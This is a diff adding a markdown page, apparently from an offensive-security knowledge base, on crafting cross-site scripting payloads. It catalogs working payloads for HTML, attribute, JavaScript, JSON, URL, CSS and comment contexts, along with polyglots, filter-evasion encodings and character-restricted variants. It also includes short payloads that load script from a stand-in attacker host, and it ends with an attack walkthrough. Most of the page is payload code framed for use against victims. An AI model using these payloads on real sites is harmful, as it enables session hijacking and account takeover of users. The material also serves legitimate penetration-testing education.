@@ -1,0 +1,543 @@
+---
+title: Payload Construction
+description: Context-aware XSS payload crafting - the escape-then-execute discipline that distinguishes operators from script-kiddies, payload catalogs organized by escape context, polyglot payloads that fire across multiple contexts, minimal payloads for length-restricted fields, and the canonical patterns for breaking out of HTML attributes, JavaScript strings, JSON values, and URL contexts.
+mitre: [T1059.007]
+d3fend: [D3-CBV]
+impact: [SessionTakeover, AccountTakeover]
+owasp: [A03]
+sidebar:
+  order: 7
+  label: Payload construction
+---
+
+## TL;DR
+
+XSS payload construction is two steps performed in order: **escape** the surrounding context, then **execute** your code. A payload that doesn't escape first lands in the data layer and never executes. A payload that escapes too aggressively breaks the surrounding HTML and doesn't render. The catalog below organizes payloads by what they escape *out of*.
+
+```
+# 1. Identify the context - what is your input embedded in?
+# 2. Pick the escape: characters that terminate the current context
+# 3. Append the execution: JavaScript or HTML that runs after escape
+
+# HTML body - no escape needed
+<svg onload=alert(1)>
+
+# Double-quoted attribute - escape is "
+" onmouseover=alert(1) x="
+
+# Single-quoted attribute - escape is '
+' onmouseover=alert(1) x='
+
+# JS string (double-quoted) - escape is "; for terminate, then //
+"; alert(1); //
+
+# JSON inside script - escape is </script>
+</script><svg onload=alert(1)>
+
+# href attribute - no escape needed, use javascript: scheme
+javascript:alert(1)
+
+# Polyglot - works in many contexts at once
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
+Success indicator: payload executes the expected JavaScript in the victim's browser. `alert(document.domain)` proves same-origin execution.
+
+## The escape-then-execute discipline
+
+A common failure mode for new XSS operators: paste `<script>alert(1)</script>` everywhere, wonder why it doesn't fire. The fix is mechanical - *understand what your input lands in, then craft a payload that breaks out of that context first*.
+
+A walk-through:
+
+### Example - JSON-in-script reflection
+
+Page source:
+
+```html
+<script>
+  window.config = {"user": "VICTIM_INPUT_HERE", "role": "guest"};
+</script>
+```
+
+You inject `<script>alert(1)</script>`. The rendered output:
+
+```html
+<script>
+  window.config = {"user": "<script>alert(1)</script>", "role": "guest"};
+</script>
+```
+
+What happens? The `<script>` element's contents are JavaScript, not HTML. The literal characters `<script>alert(1)</script>` inside a JS string are just text. The browser doesn't parse a nested `<script>` tag here - it's reading JavaScript, not HTML.
+
+**The XSS doesn't fire.**
+
+But:
+
+You inject `</script><svg onload=alert(1)>`. The rendered output:
+
+```html
+<script>
+  window.config = {"user": "</script><svg onload=alert(1)>", "role": "guest"};
+</script>
+```
+
+What happens? The browser's HTML parser tokenizes the page before the JavaScript parser runs. The HTML tokenizer sees `</script>` as a script-close tag, regardless of where it appears in the surrounding content. The script block ends. The `<svg onload=...>` that follows is HTML. The `onload` fires.
+
+**The XSS fires.**
+
+The difference between failure and success: knowing that `</script>` is the escape for "inside a `<script>` block, even inside a JS string."
+
+This is the discipline. Every context has its own escape. The catalog below.
+
+## Payload catalog by context
+
+### HTML body context
+
+```html
+<!-- Input lands as text between tags -->
+<p>HERE</p>
+<div>HERE</div>
+<h1>Welcome HERE!</h1>
+```
+
+No escape needed; introduce a new tag:
+
+```html
+<svg onload=alert(1)>                          <!-- shortest universally-firing payload -->
+<img src=x onerror=alert(1)>                   <!-- bypasses some script-tag filters -->
+<script>alert(1)</script>                      <!-- classic, blocked by many filters -->
+<iframe srcdoc="<script>alert(parent.document.domain)</script>">
+<body onload=alert(1)>                         <!-- requires no existing body tag -->
+<details open ontoggle=alert(1)>               <!-- HTML5 element -->
+<video><source onerror=alert(1)></video>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>                     <!-- legacy, sometimes survives modern filters -->
+```
+
+### Attribute value context (double-quoted)
+
+```html
+<!-- Input lands inside a double-quoted attribute -->
+<input value="HERE">
+<input type="hidden" name="csrf" value="HERE">
+<a href="/search?q=HERE">link</a>
+```
+
+Escape with `"`, add new attribute:
+
+```
+" onmouseover=alert(1) x="                     <!-- needs hover -->
+" autofocus onfocus=alert(1) x="               <!-- auto-fires on input fields -->
+" onclick=alert(1) x="                         <!-- needs click -->
+"><svg onload=alert(1)>                        <!-- escape attribute AND tag -->
+"><script>alert(1)</script>                    <!-- escape then new script -->
+" onpointerover=alert(1) x="                   <!-- newer event, bypasses old filters -->
+```
+
+For `<input>` specifically, `autofocus onfocus=` is the gold standard - fires immediately on page load with no user action.
+
+### Attribute value context (single-quoted)
+
+```html
+<input value='HERE'>
+<a href='/page?q=HERE'>link</a>
+```
+
+Symmetric to double-quoted; swap quotes:
+
+```
+' onmouseover=alert(1) x='
+' autofocus onfocus=alert(1) x='
+'><svg onload=alert(1)>
+```
+
+### Attribute value context (unquoted)
+
+```html
+<input value=HERE>
+```
+
+Space, tab, or slash to break:
+
+```
+ onmouseover=alert(1)                          <!-- space -->
+/onmouseover=alert(1)                          <!-- slash works as attribute separator in HTML5 -->
+%09onmouseover=alert(1)                        <!-- tab via URL encoding -->
+%0Aonmouseover=alert(1)                        <!-- newline -->
+```
+
+### JS context - inside a double-quoted string
+
+```html
+<script>var query = "HERE";</script>
+```
+
+Escape: close the string, add JS, comment out the rest:
+
+```
+"; alert(1); //
+"; alert(1); var z="                           <!-- if // is filtered, use a dummy variable -->
+\"; alert(1); //                               <!-- if " is auto-backslashed, try double-escape -->
+```
+
+The `;` after the escape terminates the JS statement; `//` comments out the original closing `"`.
+
+### JS context - inside a single-quoted string
+
+```html
+<script>var query = 'HERE';</script>
+```
+
+```
+'; alert(1); //
+';alert(1)//
+```
+
+### JS context - inside a template literal
+
+```html
+<script>var greeting = `Hello, HERE`;</script>
+```
+
+Template literals allow `${}` interpolation, evaluated as JS:
+
+```
+${alert(1)}
+${alert(document.domain)}
+```
+
+No string-escape needed; the `${...}` placeholder syntax invokes JS directly.
+
+### JS context - unquoted (numeric / variable)
+
+```html
+<script>var userId = HERE;</script>
+```
+
+Pure JavaScript, no quote to break:
+
+```
+alert(1)
+0;alert(1);0
+1-alert(1)-1                                   <!-- ensures the surrounding code still parses -->
+```
+
+### JSON-inside-script context
+
+```html
+<script>var data = {"name": "HERE"};</script>
+```
+
+The browser's HTML parser tokenizes `</script>` before JS parsing:
+
+```
+</script><svg onload=alert(1)>
+</script><script>alert(1)</script>
+</ScRiPt><svg onload=alert(1)>                 <!-- case-insensitive match -->
+</script   ><svg onload=alert(1)>              <!-- whitespace allowed inside closing tag -->
+```
+
+If the application JSON-encodes the value (escaping `<` to `\u003c`), this doesn't work - JSON-encoded content is safe in JS strings *and* in HTML inside scripts. Modern apps that properly JSON.stringify their output aren't vulnerable to this class.
+
+### URL attribute context
+
+```html
+<a href="HERE">click</a>
+<iframe src="HERE">
+```
+
+`javascript:` pseudo-scheme:
+
+```
+javascript:alert(1)
+javascript:alert(document.domain)
+javasc&Tab;ript:alert(1)                       <!-- HTML entity injection mid-scheme -->
+JaVaScRiPt:alert(1)                            <!-- case bypass for filters checking exact match -->
+data:text/html,<script>alert(1)</script>      <!-- data URI, sometimes works -->
+```
+
+Or break the attribute:
+
+```
+"><script>alert(1)</script>
+"><svg onload=alert(1)>
+```
+
+For `href`, requires user click. For `iframe src`, auto-loads - but modern browsers restrict cross-context `javascript:` URLs in iframes.
+
+### CSS context
+
+```html
+<style>body { color: HERE; }</style>
+<div style="color: HERE">text</div>
+```
+
+Direct JS execution from CSS is no longer possible (IE-only `expression()` is dead). Two indirect paths:
+
+```
+</style><svg onload=alert(1)>                  <!-- escape style block -->
+"><svg onload=alert(1)>                        <!-- escape style attribute -->
+```
+
+### Comment context
+
+```html
+<!-- User comment: HERE -->
+```
+
+Escape the comment:
+
+```
+--><svg onload=alert(1)><!--
+```
+
+### `<noscript>` context
+
+```html
+<noscript>HERE</noscript>
+```
+
+`<noscript>` content is parsed only when JS is disabled. If JS is enabled, the content stays text. But - *the HTML parser still tokenizes*, just doesn't render. mXSS-style attacks can move the payload out of `<noscript>` during DOM manipulation:
+
+```
+</noscript><svg onload=alert(1)>
+```
+
+## Polyglot payloads
+
+A payload that fires in multiple contexts simultaneously. Useful when you don't know the exact context, or for spray-and-pray fuzzing.
+
+### The Mario Heiderich polyglot
+
+The famous one:
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
+Designed to fire in:
+
+- `href` attribute (the `javascript:` scheme)
+- HTML body (the `<svg onload>` at end)
+- Inside `<style>`, `<title>`, `<textarea>`, `<script>`, comment - escaped via the closing-tag sequence
+- JS string contexts via the `*/` and `//` comments
+
+Drawbacks: long, conspicuous, blocked by many WAFs because of its very obviousness.
+
+### Shorter polyglots
+
+```
+">'-><script>alert(1)</script>
+"><svg onload=alert(1)>
+"-prompt(1)-"
+'-alert(1)-'
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html onmouseover="/*&lt;svg/*/onload=alert()//
+```
+
+Each tries different escape sequences. Test them all when context is unknown.
+
+## Minimal payloads (length-restricted contexts)
+
+Some fields limit input to 16-30 characters. Short payloads:
+
+```
+<svg/onload=alert(1)>                          22 chars
+<a href=//<attacker>/x.js>                     varies - relies on external script load
+<script src=//x.cc>                            18 chars - external script (DNS-shortened domain)
+<svg onload=alert``>                           20 chars - tagged template, no parens
+```
+
+The `alert\`\`` form uses tagged template literals to invoke `alert` without parentheses - bypasses filters that block `(`.
+
+For ultra-short:
+
+```
+<svg/onload=eval(name)>                        21 chars
+```
+
+Combine with `window.name='alert(1)'` set by attacker page - the target's `eval(name)` executes the attacker-set name.
+
+## Payloads without specific characters
+
+Filter regimes that block specific characters require structural workarounds.
+
+### Without parentheses
+
+Many filters block `(` because it appears in `alert(...)`. Alternatives:
+
+```javascript
+alert`1`                                       // tagged template literal
+onerror=alert;throw 1                          // throw triggers onerror handler with arg
+[1].find(alert)                                // method that calls callback with arg
+Object.defineProperty(...,{get:alert,...})     // getter trick
+```
+
+### Without quotes
+
+```javascript
+alert(/xss/.source)                            // regex source - string-typed without quotes
+alert(String.fromCharCode(88,83,83))           // build string from char codes
+```
+
+### Without spaces
+
+```html
+<svg/onload=alert(1)>                          <!-- slash separates tag and attribute -->
+<svg%09onload=alert(1)>                        <!-- tab via URL encoding -->
+<img/src/onerror=alert(1)>                     <!-- multiple slashes work in HTML5 -->
+```
+
+### Without alphabetic characters
+
+The infamous one. Pure punctuation JavaScript:
+
+```javascript
+[][(![]+[])[+!![]]+([][[]]+[])[+!![]]+...]
+```
+
+Each `[]+[]` expression evaluates to a string ("undefined"); index into it for letters. Build "alert" character by character, then call. The resulting payload is enormous and conspicuous; included for completeness, never useful in practice.
+
+## Browser-specific quirks
+
+XSS sometimes works in one browser and not another:
+
+| Quirk | Browser(s) |
+| --- | --- |
+| `<iframe srcdoc>` | All modern browsers |
+| `javascript:` in `<iframe src>` | Cross-context blocked in modern Chrome/Firefox |
+| `onfocus` on `<input autofocus>` | All browsers |
+| `<details open ontoggle>` | All but very old Safari |
+| `Function('')()` constructor | All browsers |
+| `data:text/html` navigation | Restricted in modern browsers |
+| `URL` constructor with `javascript:` | Chrome only |
+| HTML entity in scheme `javasc&Tab;ript:` | Browser tolerance varies |
+
+When a payload works in Firefox but not Chrome (or vice versa), check whether the victim model uses a specific browser. Internal corporate apps often constrain to Chrome or Edge; admins are reachable via that constraint.
+
+## Encoding tricks
+
+Sometimes the payload itself is fine but it doesn't survive transport. Encoding helps it through filters.
+
+### HTML entities
+
+```html
+<svg onload=alert&#40;1&#41;>                  <!-- &#40;= ( &#41;= ) -->
+<svg onload=alert&lpar;1&rpar;>                <!-- named entities -->
+<svg onload="alert&#x28;1&#x29;">              <!-- hex entities -->
+```
+
+### URL encoding
+
+```
+%3Csvg%20onload%3Dalert(1)%3E                  <!-- <svg onload=alert(1)> -->
+%3Csvg%2Fonload%3Dalert%281%29%3E              <!-- with paren encoding -->
+```
+
+### Double URL encoding
+
+```
+%253Csvg%2520onload%253Dalert(1)%253E
+```
+
+Bypasses filters that decode-then-scan once. The server's second decode reveals the payload.
+
+### Unicode escape
+
+```javascript
+\u003cscript\u003ealert(1)\u003c/script\u003e
+```
+
+In some JS contexts (eval, Function constructor), Unicode escapes within identifiers and strings are evaluated.
+
+### Hex escape
+
+```javascript
+\x3cscript\x3ealert(1)\x3c/script\x3e
+```
+
+Inside JS string literals, `\x3c` = `<`. The string-context payload becomes valid even when the original parser would reject `<`.
+
+## A worked walkthrough - payload iteration
+
+Target page renders `?msg=` parameter into:
+
+```html
+<div class="alert"><b>HERE</b></div>
+```
+
+### Round 1 - Probe
+
+```
+?msg=<svg onload=alert(1)>
+```
+
+Response:
+
+```html
+<div class="alert"><b>&lt;svg onload=alert(1)&gt;</b></div>
+```
+
+`<` and `>` HTML-encoded. Direct injection blocked.
+
+### Round 2 - Test for what survives
+
+```
+?msg=test"quote'and<more>chars&amp;
+```
+
+Response:
+
+```html
+<div class="alert"><b>test&quot;quote&#039;and&lt;more&gt;chars&amp;amp;</b></div>
+```
+
+Everything encoded. No obvious escape character. Move on or look for other rendering surfaces.
+
+### Round 3 - Find a different reflection
+
+Try a different param. After more probing, find that `?type=` reflects into:
+
+```html
+<input type="HERE">
+```
+
+Submit:
+
+```
+?type="><svg onload=alert(1)>
+```
+
+Response:
+
+```html
+<input type=""><svg onload=alert(1)>">
+```
+
+XSS fires. The `?msg=` reflection was the red herring; `?type=` is the real bug.
+
+The lesson: don't fixate on one reflection. The same page often has multiple inputs reflecting into different contexts with different escaping treatments. Probe all of them.
+
+## Quick reference
+
+| Context | Escape | Payload after escape |
+| --- | --- | --- |
+| HTML body | none | `<svg onload=alert(1)>` |
+| Attribute (double-quoted) | `"` | `" onmouseover=alert(1) x="` |
+| Attribute (single-quoted) | `'` | `' onmouseover=alert(1) x='` |
+| Attribute (unquoted) | ` ` or `/` | `/onmouseover=alert(1)` |
+| JS string (double) | `"` | `"; alert(1); //` |
+| JS string (single) | `'` | `'; alert(1); //` |
+| JS template literal | none | `${alert(1)}` |
+| JS unquoted | none | `alert(1)` |
+| JSON in script | `</script>` | `</script><svg onload=alert(1)>` |
+| URL attribute | none | `javascript:alert(1)` |
+| Auto-firing in attribute | `"` | `" autofocus onfocus=alert(1) x="` |
+| Without parens | template literal | ``alert`1` `` |
+| Without quotes | regex source | `alert(/xss/.source)` |
+| Without spaces | slash | `<svg/onload=alert(1)>` |
+| Polyglot (short) | mixed | `"-prompt(1)-"` |
+| URL-encoded | %xx | `%3Csvg%20onload%3Dalert(1)%3E` |
+| Double-encoded | %25xx | `%253Csvg%2520onload%253Dalert(1)%253E` |
+| Confirm same-origin | proof | `alert(document.domain)` |
+
+For WAF/filter bypasses when payloads are blocked, see [Filter bypasses](/codex/web/xss/filter-bypasses/). For blind XSS payload patterns specifically tailored to admin renderers you can't observe directly, see [Blind XSS](/codex/web/xss/blind-xss/).
